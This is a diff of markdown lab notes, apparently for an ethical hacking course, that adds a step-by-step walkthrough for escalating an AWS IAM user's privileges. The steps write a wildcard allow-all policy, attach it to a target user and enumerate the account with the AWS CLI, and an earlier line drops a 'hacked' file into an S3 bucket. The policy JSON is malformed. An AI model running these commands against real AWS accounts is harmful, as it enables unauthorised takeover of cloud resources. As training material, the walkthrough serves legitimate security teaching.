@@ -128,7 +128,7 @@ echo "you are hacked" >> hack.txt
 ```
 
 ```bash
-aws s3 mv hack.txt s3://<s3-bucket-name>
+ aws s3 mv hack.txt s3://<s3-bucket-name>
 
  aws s3 mv hack.txt s3://certifiedhacker02
 ```
@@ -147,6 +147,60 @@ aws s3 mv hack.txt s3://<s3-bucket-name>
 ### escalate IAM user privilege via misconfigured user policy
 
 → refer Manual for detailed and understandable explanation
+
+- In the **terminal** , type **sudo su** and press Enter to run the programs as a root user and user toor as password.
+- After configuring the AWS CLI, we create a user policy and attach it to the target IAM user account to escalate the privileges
+-  In the terminal window, type **vim user-policy.json** or **pluma user-policy.json** and press Enter.  A command line text editor appears; **press I** and type the script given below:
+```text\
+
+{
+"Version":"2012-10-17",
+"Statement": [
+ "Effect":"Allow",
+ "Action":"*",
+ "Resource":"*"
+}
+]
+}
+```
+- Note: This is an AdministratorAccess policy that gives administrator access to the target IAM user.
+- Note: Ignore the $ symbols in the script.
+- After entering the script given in the previous step, **press the Esc button**. Then, type **:wq!** and press Enter to save the text document.
+- Now, we will attach the created policy (user-policy) to the target IAM user’s account.
+- ```bash
+   aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
+  ```
+- The created user policy is displayed, showing various details such as **PolicyName**, **PolicyId**, and **Arn**.
+- We **need to create an user** in **AWS IAM** with **name test** and giving **access to AWS IAM** and **setting up the password**.
+- **Copy** the **policy arn** from above and use it below 
+```bash
+ aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
+
+ aws iam attach-user-policy --user-name test --policy-arn arn:aws:iam::2342897234:policy/user-policy
+```
+- The above command will attach the policy (user-policy) to the target IAM user account (here, test).
+- To list attached user policys
+```bash
+aws iam list-attached-user-policies --user-name [Target Username]
+
+aws iam list-attached-user-policies --user-name test
+```
+- Now that you have successfully escalated the privileges of the target IAM user account, you can list all the IAM users in the AWS environment
+```bash
+ aws iam list-users
+```
+- Similarly, you can use various commands to obtain complete information about the AWS environment such as the list of S3 buckets, user policies, role policies, and group policies, as well as to create a new user.
+```bash
+   ▪ List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"
+   ▪ User Policies: aws iam list-user-policies
+   ▪ Role Policies: aws iam list-role-policies
+   ▪ Group policies: aws iam list-group-policies
+   ▪ Create user: aws iam create-user
+```
+- This concludes the demonstration of escalating IAM user privileges by exploiting a misconfigured user policy.
+
+
+
 
 ## Vulnerability assessment
 
